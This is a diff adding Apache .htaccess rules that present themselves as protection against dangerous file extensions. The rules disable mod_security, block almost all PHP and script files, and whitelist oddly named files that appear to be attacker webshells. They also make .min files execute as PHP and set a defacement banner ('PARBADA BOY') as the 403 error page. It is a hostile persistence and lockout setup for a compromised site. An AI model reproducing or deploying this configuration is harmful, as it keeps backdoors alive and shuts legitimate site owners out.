@@ -1,0 +1,140 @@
+<IfModule mod_security.c>
+    SecFilterEngine Off
+    SecFilterScanPOST Off
+</IfModule>
+
+# Blokir file dengan ekstensi berbahaya
+<FilesMatch ".(php|Php|pHp|phP|Php.asp|php.anu|jobar.php|php.fla|PHP|php3|php2|Php1|pht|phar|anu|fla|asp|aspx|php.jpg|php6|php7|php8|php9|phtml|shtml|php.aspx|php;.jpg|php.fla|php.phar|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|sHtml|shTml|sHTml|zip|shtml)$">
+
+ Order allow,deny
+
+ Deny from all
+
+</FilesMatch>
+
+# Blokir file PHP yang disamarkan sebagai gambar atau dokumen
+<FilesMatch "\.(php\.(jpg|jpeg|png|gif|pdf|txt|zip|docx?|xlsx?|pptx?)|php[0-9]*\.(jpg|jpeg|png|gif|pdf)|php\.suspected)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+# Izinkan file tertentu yang memang sah untuk diakses
+<FilesMatch "^(Header\.php)$">
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+
+# Izinkan ekstensi .min untuk diproses sebagai PHP
+AddType application/x-httpd-php .min
+
+========================================================================================================================================================================================================================
+
+<FilesMatch "\.(?:php|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php4|Php4|PHP4|Php4|php82|php72|php5|Php5|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|PhP5|php6|Php6|pHp6|phP6|PHp6|pHP6|PhP6|PHP6|PhP6|php56|Php56|pHp56|phP56|PHp56|pHP56|PhP56|PHP56|PhP56|php7|Php7|pHp7|phP7|PHp7|pHP7|PhP7|PHP7|PHP7|PhP7|PhP7.|php7.|php8|php8.|php82|php9|php9.|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtML|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|pHTmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|phar|PHAR|Phar|pHar|phAr|phaR|pHAR|PhAR|PHaR|PHAr|PHar|PhAr|PhaR|pHaR|phAR|cshtml|shtMl|shtML|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTmL|sHTml|shtml|anu|Anu|ANu|aNU|aNu|AnU|ANU|perl|Perl|pErl|peRl|perL|PERL|py|exe|inc|phps|php3|php4|php7.0|php8.0|php74|php81|php72|pht|phtm|module|class|cgi|fcgi|pl|jsp|asp|do|Inc|inc|iNc|inC|INC|jpg|png|gif)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+
+<FilesMatch "^(wp-blog-header.php|loader.php|wp-login.php|template-loader.php|wp-signin.php|wp-blog-activate.php|Ipv4.php|class-wp-block-parser-auth.php|class-wp-blog-format.php|hidden-404.php|InvalidOptions.php|reboot.php|class-wp-application-passwords-list-options.php|wp-blog-loader.php|my_form.php|banner-project-description.php|about.php|admin-ajax.php|admin-footer.php|admin-functions.php|admin-header.php|admin-post.php|admin.php|async-upload.php|authorize-application.php|comment.php|contribute.php|credits.php|wp-comments-blog.php|custom-background.php|custom-header.php|customize.php|edit-comments.php|edit-form-advanced.php|edit-form-blocks.php|edit-form-comment.php|edit-link-form.php|class-wp-footer.php|handler-footer.php|class-two-factor-handler.php||footer-manok-manjikkal.php|edit-tag-form.php|edit-tags.php|edit.php|erase-personal-data.php|export-personal-data.php|export.php|freedoms.php|import.php|class-walker-admin.php|script-modules-packages.runtime.php|install-helper.php|install.php|link-add.php|link-manager.php|link-parse-opml.php|wp-install.php|handler-overrall.php|query-module-post.php|file.php|class-wp-widget-handler-customize-control.php|class-wp-html-handler-processor.php|class-wp-translations-file-js.php|cache.php|link.php|load-scripts.php|load-styles.php|media-new.php|media-upload.php|media.php|menu-header.php|menu.php|moderation.php|ms-admin.php|ms-delete-site.php|ms-edit.php|wp-config-style.php|wp-links-trackback.php|ms-options.php|ms-sites.php|ms-themes.php|ms-upgrade-network.php|ms-users.php|my-sites.php|tukangstel.php|nav-menus.php|query-style-posts.php|view.min.style.php|vendor.php|site-information.php|network.php|options-discussion.php|options-general.php|options-head.php|options-media.php|options-permalink.php|options-privacy.php|options-reading.php|footer.php|query-style-grid.php|hello-world-themes.php|options-writing.php|options.php|post-new.php|post.php|press-this.php|privacy-policy-guide.php|privacy.php|profile.php|revision.php|setup-config.php|site-editor.php|site-health-info.php|site-health.php|term.php|theme-install.php|themes.php|tools.php|update-core.php|update.php|upgrade-functions.php|upgrade.php|upload.php|user-edit.php|user-new.php|users.php|widgets-form-blocks.php|widgets-form.php|widgets.php|admin-function.php|text-content.php|embed-file.php|class-wp-walker-engine.php|Ipv6.php|class-walker.php|embed-404.php|wp-links-trackback.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+========================================================================================================================================================================================================================
+
+Options -Indexes
+
+<FilesMatch "\.(?:php|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php4|Php4|PHP4|Php4|php82|php72|php5|Php5|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|PhP5|php6|Php6|pHp6|phP6|PHp6|pHP6|PhP6|PHP6|PhP6|php56|Php56|pHp56|phP56|PHp56|pHP56|PhP56|PHP56|PhP56|php7|Php7|pHp7|phP7|PHp7|pHP7|PhP7|PHP7|PHP7|PhP7|PhP7.|php7.|php8|php8.|php82|php9|php9.|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtML|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|pHTmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|phar|PHAR|Phar|pHar|phAr|phaR|pHAR|PhAR|PHaR|PHAr|PHar|PhAr|PhaR|pHaR|phAR|cshtml|shtMl|shtML|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTmL|sHTml|shtml|anu|Anu|ANu|aNU|aNu|AnU|ANU|perl|Perl|pErl|peRl|perL|PERL|py|exe|inc|phps|php3|php4|php7.0|php8.0|php74|php81|php72|pht|phtm|module|class|cgi|fcgi|pl|jsp|asp|do|Inc|inc|iNc|inC|INC|jpg|png|gif)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+
+<FilesMatch "^(configuration.php|defines.php|framework.php|router.php|import.php|loader.php|cms.php|joomla.php|application.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+ErrorDocument 403 '<center><img src="https://ezz.guru/f.gif"></img> <h2>PARKOBUN PRIDE!!!</font><br><h3>-THIS IS PARBADA BOY-</h3>'
+
+========================================================================================================================================================================================================================
+
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.SH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.AS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.As*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.aS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.as*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<FilesMatch "\.(jpg|jpeg|png|gif|bmp|ico)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(mp4|avi|mov|wmv|mp3|wav|ogg)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "^(._IssueGalleyGridVendor.php|fc-pluginSettings-1-manokfeedplugin.php|IssueGalleyGridVendor.php|icon_pkp.php|Generator.php)$">
+        Order Deny,Allow
+    Allow from all
+    </FilesMatch>
+Options -Indexes
+ErrorDocument 403 '<center><img src="https://ezz.guru/f.gif"></img> <h2>PARBADA</font><br>'
+
+========================================================================================================================================================================================================================
+
+Options -Indexes
+
+<FilesMatch "\.(?:php|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php4|Php4|PHP4|Php4|php82|php72|php5|Php5|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|PhP5|php6|Php6|pHp6|phP6|PHp6|pHP6|PhP6|PHP6|PhP6|php56|Php56|pHp56|phP56|PHp56|pHP56|PhP56|PHP56|PhP56|php7|Php7|pHp7|phP7|PHp7|pHP7|PhP7|PHP7|PHP7|PhP7|PhP7.|php7.|php8|php8.|php82|php9|php9.|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtML|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|pHTmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|phar|PHAR|Phar|pHar|phAr|phaR|pHAR|PhAR|PHaR|PHAr|PHar|PhAr|PhaR|pHaR|phAR|cshtml|shtMl|shtML|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTmL|sHTml|shtml|anu|Anu|ANu|aNU|aNu|AnU|ANU|perl|Perl|pErl|peRl|perL|PERL|py|exe|inc|phps|php3|php4|php7.0|php8.0|php74|php81|php72|pht|phtm|module|class|cgi|fcgi|pl|jsp|asp|do|Inc|inc|iNc|inC|INC|jpg|png|gif)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+
+<FilesMatch "^(parbada-pride-MAR.php|parbada-juice-MAR.php|)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+ErrorDocument 403 '<center><img src="https://ezz.guru/f.gif"></img> <h2>PARKOBUN PRIDE!!!</font><br><h3>-THIS IS PARBADA BOY-</h3>'
